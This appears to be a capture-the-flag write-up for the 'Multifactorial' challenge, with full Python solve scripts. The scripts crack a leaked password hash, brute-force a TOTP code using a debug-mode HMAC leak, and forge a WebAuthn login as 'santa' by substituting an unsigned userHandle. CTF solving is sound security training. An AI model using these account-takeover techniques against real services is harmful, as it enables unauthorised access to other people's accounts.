# Day 14 Multifactorial

Step 1: hidden sha1 in the source code: `bf33632dd9668787878890cb4fbb54261b6b7571`, crack it in <https://crackstation.net/> leads to `northpole123`. It is the answer.

Step 2: the `/api/something-you-have-verify?debug=0` endpoint has argument `debug`, if we set it to `1`, we can have `hmac` and `serverTime` in the response. The secret key is shown in the source code: `17_w0Uld_83_V3Ry_fUNnY_1f_y0U_7H0u9H7_7H15_W45_4_Fl49`. According to the hint:

```
Stage 2: HMAC = sha256(secret_key, message). The message is just the six-digit TOTP code (and there are only 999,999 possibilities of that!).
```

We can find correct TOTP code by bruteforcing:

```python
#!/usr/bin/env python3
import hashlib
import hmac
import requests
import json
import time

def brute_force_totp(hmac_hex, secret_key):
    """Brute force TOTP code given HMAC and secret key."""
    target_hmac = bytes.fromhex(hmac_hex)
    
    for code in range(1000000):
        code_str = f"{code:06d}"
        # Compute HMAC-SHA256(secret_key, code_str)
        h = hmac.new(secret_key.encode(), code_str.encode(), hashlib.sha256)
        if h.digest() == target_hmac:
            return code_str
    return None

def main():
    # Get session
    resp = requests.post(
        "https://multifactorial.csd.lol/api/something-you-know-check",
        json={"password": "northpole123"}
    )
    session_cookie = resp.headers.get('Set-Cookie', '').split(';')[0]
    
    headers = {"Cookie": session_cookie, "Content-Type": "application/json"}
    
    # Get current HMAC with debug=1
    debug_resp = requests.post(
        "https://multifactorial.csd.lol/api/something-you-have-verify?debug=1",
        headers=headers,
        json={"code": "000000"}  # Submit dummy code
    )
    
    debug_data = debug_resp.json()
    hmac_hex = debug_data["hmac"]
    server_time = debug_data["serverTime"]
    
    print(f"HMAC: {hmac_hex}")
    print(f"Time: {server_time}")
    
    # Try ORACLE_KEY as secret
    secret_key = "17_w0Uld_83_V3Ry_fUNnY_1f_y0U_7H0u9H7_7H15_W45_4_Fl49"
    
    print(f"Brute forcing with secret: {secret_key}")
    start = time.time()
    code = brute_force_totp(hmac_hex, secret_key)
    elapsed = time.time() - start
    
    if code:
        print(f"Found code: {code} (took {elapsed:.2f}s)")
        
        # Test the code
        verify_resp = requests.post(
            "https://multifactorial.csd.lol/api/something-you-have-verify",
            headers=headers,
            json={"code": code}
        )
        
        print(f"Verify response: {verify_resp.status_code}")
        print(f"Verify data: {verify_resp.text}")
    else:
        print(f"No code found (took {elapsed:.2f}s)")

if __name__ == "__main__":
    main()
```


Step 3. We need to use WebAuthn to authenticate, while faking as santa. First, we need a software WebAuthn implementation `SoftWebauthnDevice` from <https://raw.githubusercontent.com/bodik/soft-webauthn/refs/heads/master/soft_webauthn.py>. Then, we can:

1. request registration options using `attacker` as name
2. create credential using `SoftWebauthnDevice`
3. register the credential
4. request authentication option, override the userHandle for `santa`
5. authenticate as `santa` and access admin panel

```python
#!/usr/bin/env python3
import hashlib
import hmac
import requests
import json
import time
import base64
from soft_webauthn import SoftWebauthnDevice

def brute_force_totp(hmac_hex, secret_key):
    target_hmac = bytes.fromhex(hmac_hex)
    for code in range(1000000):
        code_str = f"{code:06d}"
        h = hmac.new(secret_key.encode(), code_str.encode(), hashlib.sha256)
        if h.digest() == target_hmac:
            return code_str
    return None

def main():
    print("=== Exploiting WebAuthn userHandle vulnerability (16-byte version) ===")
    
    # Stage 1: Password
    resp = requests.post(
        "https://multifactorial.csd.lol/api/something-you-know-check",
        json={"password": "northpole123"}
    )
    session_cookie = resp.headers.get('Set-Cookie', '').split(';')[0]
    headers = {"Cookie": session_cookie, "Content-Type": "application/json"}
    
    # Stage 2: TOTP
    debug_resp = requests.post(
        "https://multifactorial.csd.lol/api/something-you-have-verify?debug=1",
        headers=headers,
        json={"code": "000000"}
    )
    hmac_hex = debug_resp.json()["hmac"]
    
    secret_key = "17_w0Uld_83_V3Ry_fUNnY_1f_y0U_7H0u9H7_7H15_W45_4_Fl49"
    code = brute_force_totp(hmac_hex, secret_key)
    
    verify_resp = requests.post(
        "https://multifactorial.csd.lol/api/something-you-have-verify",
        headers=headers,
        json={"code": code}
    )
    
    if verify_resp.status_code != 200:
        print("TOTP failed")
        return
    
    print("Passed TOTP")
    
    # Stage 3: WebAuthn
    
    # First, register a passkey with a test name
    test_name = "attacker"
    print(f"\n1. Registering passkey for: {test_name}")
    
    # Get registration options
    reg_options_resp = requests.post(
        "https://multifactorial.csd.lol/api/webauthn/register/options",
        headers=headers,
        json={"name": test_name}
    )
    
    if reg_options_resp.status_code != 200:
        print(f"Registration options failed: {reg_options_resp.text}")
        return
    
    reg_options = reg_options_resp.json()
    print(f"Got registration options")
    
    # The server returns challenge as base64url string
    # We need to convert it to bytes for SoftWebauthnDevice
    challenge_b64url = reg_options['publicKey']['challenge']
    # Convert from base64url to bytes
    challenge = base64.urlsafe_b64decode(challenge_b64url + '==')
    reg_options['publicKey']['challenge'] = challenge
    
    # Also convert user.id from base64url to bytes
    user_id_b64url = reg_options['publicKey']['user']['id']
    user_id = base64.urlsafe_b64decode(user_id_b64url + '==')
    reg_options['publicKey']['user']['id'] = user_id
    
    # Create software authenticator
    device = SoftWebauthnDevice()
    
    # Create credential
    origin = "https://multifactorial.csd.lol"
    credential = device.create(reg_options, origin)
    
    # Prepare registration verify request
    registration_request = {
        "name": test_name,
        "id": base64.urlsafe_b64encode(credential['rawId']).decode().rstrip('='),
        "rawId": base64.urlsafe_b64encode(credential['rawId']).decode().rstrip('='),
        "type": credential['type'],
        "response": {
            "clientDataJSON": base64.urlsafe_b64encode(credential['response']['clientDataJSON']).decode().rstrip('='),
            "attestationObject": base64.urlsafe_b64encode(credential['response']['attestationObject']).decode().rstrip('=')
        }
    }
    
    # Send registration
    reg_verify_resp = requests.post(
        "https://multifactorial.csd.lol/api/webauthn/register/verify",
        headers=headers,
        json=registration_request
    )
    
    if reg_verify_resp.status_code != 200:
        print(f"Registration failed: {reg_verify_resp.status_code}, {reg_verify_resp.text}")
        return
    
    reg_data = reg_verify_resp.json()
    print(f"Registration successful!")
    print(f"Credential ID: {reg_data.get('credId', 'N/A')}")
    print(f"UserHandle returned: {reg_data.get('userHandle', 'N/A')}")
    
    # Now we have a registered passkey
    # Let's get authentication options
    print("\n2. Getting authentication options...")
    auth_options_resp = requests.post(
        "https://multifactorial.csd.lol/api/webauthn/auth/options",
        headers=headers
    )
    
    if auth_options_resp.status_code != 200:
        print(f"Auth options failed: {auth_options_resp.status_code}, {auth_options_resp.text}")
        return
    
    auth_options = auth_options_resp.json()
    print(f"Got authentication options")
    
    # Convert challenge from base64url to bytes
    auth_challenge_b64url = auth_options['publicKey']['challenge']
    auth_challenge = base64.urlsafe_b64decode(auth_challenge_b64url + '==')
    auth_options['publicKey']['challenge'] = auth_challenge
    
    # Generate authentication assertion
    print("\n3. Generating authentication assertion...")
    assertion = device.get(auth_options, origin)
    
    # Compute santa's userHandle (FIRST 16 BYTES of SHA256 of "santa" base64url encoded)
    santa_sha256 = hashlib.sha256(b"santa").digest()
    santa_first_16 = santa_sha256[:16]
    santa_user_handle = base64.urlsafe_b64encode(santa_first_16).decode().rstrip('=')
    print(f"Santa userHandle (first 16 bytes): {santa_user_handle}")
    
    # Also compute full SHA256 for comparison
    santa_full = base64.urlsafe_b64encode(santa_sha256).decode().rstrip('=')
    print(f"Santa userHandle (full SHA256): {santa_full}")
    
    # Modify the assertion to use santa's userHandle
    # This is the exploit: userHandle is not signed!
    print("\n4. Modifying assertion to use santa's userHandle...")
    
    # Try with first 16 bytes
    auth_request = {
        "id": base64.urlsafe_b64encode(assertion['rawId']).decode().rstrip('='),
        "rawId": base64.urlsafe_b64encode(assertion['rawId']).decode().rstrip('='),
        "type": assertion['type'],
        "userHandle": santa_user_handle,  # EXPLOIT: Use santa's userHandle (first 16 bytes)
        "response": {
            "authenticatorData": base64.urlsafe_b64encode(assertion['response']['authenticatorData']).decode().rstrip('='),
            "clientDataJSON": base64.urlsafe_b64encode(assertion['response']['clientDataJSON']).decode().rstrip('='),
            "signature": base64.urlsafe_b64encode(assertion['response']['signature']).decode().rstrip('=')
        }
    }
    
    print(f"Sending authentication with santa userHandle (first 16 bytes)...")
    auth_verify_resp = requests.post(
        "https://multifactorial.csd.lol/api/webauthn/auth/verify",
        headers=headers,
        json=auth_request
    )
    
    print(f"\nAuthentication response: {auth_verify_resp.status_code}")
    print(f"Response: {auth_verify_resp.text}")
    
    if auth_verify_resp.status_code == 200:
        auth_data = auth_verify_resp.json()
        print(f"Message: {auth_data.get('message', 'N/A')}")
        
        if "santa" in auth_data.get('message', '').lower():
            print("\nSUCCESS! Authenticated as santa!")
            
            # Now try to access /admin
            print("\n5. Accessing /admin as santa...")
            admin_resp = requests.get(
                "https://multifactorial.csd.lol/admin",
                headers=headers
            )
            
            print(f"Admin page status: {admin_resp.status_code}")
            if admin_resp.status_code == 200:
                print("\n=== FLAG FOUND ===")
                print(admin_resp.text)
            else:
                print(f"Admin page: {admin_resp.text[:500]}")
        else:
            print("\nAuthenticated but not as santa")
    else:
        print("\nAuthentication failed")

if __name__ == "__main__":
    main()
```
